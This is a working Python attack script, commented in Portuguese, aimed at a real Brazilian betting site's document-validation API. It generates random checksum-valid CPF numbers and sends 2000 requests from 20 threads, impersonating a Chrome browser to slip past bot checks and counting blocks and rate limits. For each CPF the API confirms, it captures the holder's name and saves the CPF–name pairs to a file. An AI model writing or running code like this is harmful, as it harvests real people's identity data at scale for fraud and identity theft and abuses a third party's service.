#!/usr/bin/env python3
"""
Injetor 2000 Requisições - 20 threads simultâneas x 100 rodadas
"""
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from curl_cffi import requests

# Configuração
THREADS = 20
RODADAS = 100  # 20 x 100 = 2000 requisições
TOTAL = THREADS * RODADAS

# Sessão compartilhada
SESSION = None
lock = threading.Lock()

# Contadores globais
stats = {"ok": 0, "validos": 0, "blocked": 0, "rate_limit": 0, "erro": 0}
cpfs_validos = []

def gerar_cpf():
    cpf = [random.randint(0, 9) for _ in range(9)]
    soma = sum((10 - i) * cpf[i] for i in range(9))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    soma = sum((11 - i) * cpf[i] for i in range(10))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    return ''.join(map(str, cpf))

def worker(_):
    """Worker usando sessão compartilhada"""
    global SESSION
    cpf = gerar_cpf()
    
    try:
        r = SESSION.post(
            "https://7k.bet.br/api/documents/validate",
            json={"number": cpf, "type": "cpf"},
            headers={"Content-Type": "application/json", "Origin": "https://7k.bet.br"},
            timeout=15
        )
        
        status = r.status_code
        
        with lock:
            if status == 200:
                try:
                    nome = r.json().get("data", {}).get("name", "N/A")
                except:
                    nome = "N/A"
                cpfs_validos.append({"cpf": cpf, "nome": nome})
                stats["validos"] += 1
                stats["ok"] += 1
            elif status == 400:
                stats["ok"] += 1
            elif status == 403:
                stats["blocked"] += 1
            elif status == 429:
                stats["rate_limit"] += 1
            else:
                stats["erro"] += 1
        
        return status
        
    except:
        with lock:
            stats["erro"] += 1
        return -1

def main():
    global SESSION
    
    print("="*60)
    print(f"💉 INJETOR 2000 REQUISIÇÕES")
    print("="*60)
    print(f"   Threads simultâneas: {THREADS}")
    print(f"   Rodadas: {RODADAS}")
    print(f"   Total: {TOTAL} requisições")
    print("="*60)
    
    # Cria sessão
    SESSION = requests.Session(impersonate="chrome120")
    
    inicio = time.time()
    
    for rodada in range(1, RODADAS + 1):
        # Progresso a cada 10 rodadas
        if rodada % 10 == 1 or rodada == RODADAS:
            elapsed = time.time() - inicio
            done = (rodada - 1) * THREADS
            rate = done / elapsed if elapsed > 0 else 0
            print(f"\r🚀 Rodada {rodada:3d}/{RODADAS} | {done:4d}/{TOTAL} req | {rate:.1f} req/s | ✅{stats['validos']} válidos | 🚫{stats['blocked']} blocked", end="", flush=True)
        
        # Dispara 20 threads
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = [executor.submit(worker, i) for i in range(THREADS)]
            for f in as_completed(futures):
                pass
    
    tempo = time.time() - inicio
    
    print(f"\r🚀 Rodada {RODADAS}/{RODADAS} | {TOTAL}/{TOTAL} req | COMPLETO!" + " "*30)
    
    print("\n" + "="*60)
    print("📊 RESULTADO FINAL")
    print("="*60)
    print(f"   Total requisições: {TOTAL}")
    print(f"   Tempo: {tempo:.1f}s ({tempo/60:.1f} min)")
    print(f"   Velocidade: {TOTAL/tempo:.1f} req/s")
    print(f"\n   ✅ OK (200/400): {stats['ok']}")
    print(f"   🎯 CPFs válidos: {stats['validos']}")
    print(f"   🚫 Blocked (403): {stats['blocked']}")
    print(f"   ⏳ Rate Limit (429): {stats['rate_limit']}")
    print(f"   💥 Erros/Timeout: {stats['erro']}")
    
    # Salva CPFs válidos
    if cpfs_validos:
        print(f"\n🎯 {len(cpfs_validos)} CPFs VÁLIDOS ENCONTRADOS:")
        with open("cpfs_validos_2000.txt", "w", encoding="utf-8") as f:
            for v in cpfs_validos:
                cpf = v["cpf"]
                cpf_fmt = f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}"
                linha = f"{cpf_fmt} | {v['nome']}"
                print(f"   {linha}")
                f.write(linha + "\n")
        print(f"\n💾 Salvos em cpfs_validos_2000.txt")
    
    print("="*60)

if __name__ == "__main__":
    main()







